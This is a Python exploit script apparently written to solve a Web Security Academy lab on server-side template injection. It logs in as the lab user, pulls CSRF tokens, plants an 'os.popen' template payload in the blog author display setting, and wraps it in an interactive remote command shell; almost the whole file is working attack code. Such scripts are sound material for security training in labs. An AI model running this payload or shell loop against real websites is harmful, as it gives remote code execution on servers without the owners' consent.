import http.client
import random
import re
import ssl
import string
import urllib.parse

LAB_ID = "???"


def GET_login() -> http.client.HTTPResponse:
    method, path = 'GET', '/login'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'referer': f'https://{LAB_ID}.web-security-academy.net/',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, ''.encode('utf-8'), headers)
    return connection.getresponse()


def POST_login(
        session: str,
        csrf: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/login'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': f'session={session}',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'referer': f'https://{LAB_ID}.web-security-academy.net/login',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    fields = {
        'csrf': csrf,
        'username': 'wiener',
        'password': 'peter',
    }
    body = urllib.parse.urlencode(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def GET_post(
        session: str,
        post_id: int,
) -> http.client.HTTPResponse:
    method, path = 'GET', '/post'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    query_params = [
        ('postId', str(post_id)),
    ]
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'cookie': f'session={session}',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'priority': 'u=0, i',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, f"{path}?{urllib.parse.urlencode(query_params)}", '', headers)
    return connection.getresponse()


def POST_post_comment(
        session: str,
        csrf: str,
        post_id: int,
        comment: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/post/comment'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': f'session={session}',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'priority': 'u=0, i',
        'te': 'trailers',
    }
    fields = [
        ('csrf', csrf),
        ('postId', str(post_id)),
        ('comment', comment),
    ]
    body = urllib.parse.urlencode(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def GET_myaccount(
        session: str,
) -> http.client.HTTPResponse:
    method, path = 'GET', '/my-account'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    query_params = [
        ('id', 'wiener'),
    ]
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'referer': f'https://{LAB_ID}.web-security-academy.net/login',
        'cookie': f'session={session}',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'priority': 'u=1',
        'te': 'trailers',
    }
    body = ''
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, f"{path}?{urllib.parse.urlencode(query_params)}", body, headers)
    return connection.getresponse()


def POST_myaccount_changeblogpostauthordisplay(
        session: str,
        csrf: str,
        author_display: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/my-account/change-blog-post-author-display'
    host, port = '0aea0023033fc41882c3653400320040.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': f'session={session}',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'priority': 'u=0, i',
        'te': 'trailers',
    }
    fields = [
        ('blog-post-author-display', author_display),
        ('csrf', csrf),
    ]
    body = urllib.parse.urlencode(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def login_csrf() -> tuple[str, str]:
    response = GET_login()
    cookie_header = response.getheader('set-cookie')
    session = re.findall(r'session=([a-zA-Z0-9]+);', cookie_header)[0]
    csrf = re.findall(r'name=\"csrf\" value=\"([a-zA-Z0-9]+)\"', response.read().decode('utf-8'))[0]
    return session, csrf


def login_session():
    session, csrf = login_csrf()
    response = POST_login(session, csrf)
    cookie_header = response.getheader('set-cookie')
    return re.findall(r'session=([a-zA-Z0-9]+);', cookie_header)[0]


def myaccount_csrf(session: str) -> str:
    response = GET_myaccount(session)
    csrf = re.findall(r'name=\"csrf\" value=\"([a-zA-Z0-9]+)\"', response.read().decode('utf-8'))[0]
    return csrf


def post_csrf(session: str, post_id: int) -> str:
    response = GET_post(session, post_id)
    csrf = re.findall(r'name=\"csrf\" value=\"([a-zA-Z0-9]+)\"', response.read().decode('utf-8'))[0]
    return csrf


def random_str() -> str:
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))


def exec_command(
        session: str,
        command: str,
        post_id: int,
) -> str:
    beginning = random_str()
    end = random_str()
    POST_myaccount_changeblogpostauthordisplay(
        session=session,
        csrf=myaccount_csrf(session),
        author_display=f"user.first_name}}}}{beginning}{{% import os %}}{{{{ os.popen(\"{command}\").read()}}}}{end}",
    )
    response = GET_post(
        session=session,
        post_id=post_id,
    )
    response_body = response.read().decode()
    return re.findall(rf"(?s){beginning}(.*){end}", response_body)[0]


session = login_session()
post_id = 9
print("performing sanity check")
expected_str = random_str()
POST_post_comment(
    session=session,
    csrf=post_csrf(session, post_id),
    post_id=post_id,
    comment=random_str(),
)
result = exec_command(session, f"echo {expected_str}", post_id)
if expected_str not in result:
    print("sanity check failed!")
    exit(1)
print("sanity check succeeded!")
print("shell opened")
while True:
    print(exec_command(session, input("input command: "), post_id))
